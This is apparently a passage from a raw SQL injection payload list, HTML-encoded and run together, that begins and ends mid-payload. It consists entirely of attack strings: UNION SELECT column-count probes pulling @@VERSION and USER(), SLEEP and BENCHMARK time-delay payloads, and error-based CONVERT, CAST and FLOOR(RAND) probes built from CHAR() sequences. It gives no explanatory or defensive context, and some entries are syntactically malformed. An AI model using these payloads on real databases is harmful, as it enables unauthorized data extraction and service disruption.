@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#UNION ALL SELECT USER()-- UNION ALL SELECT SLEEP(5)-- UNION ALL SELECT USER(),SLEEP(5)-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;))-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT NULL-- AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))-- AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))-- AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))-- AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))-- AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))-- AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))-- AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))-- AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))-- AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))-- AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))-- AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))-- AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))-- AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- UNION ALL SELECT NULL#AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)))#AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#UNION ALL SELECT NULL AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)))AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))AND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))AND 5650&#x3D;CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650&#x3D;5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))AND 3516&#x3D;CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516&#x3D;3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523&#x3D;4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- UNION 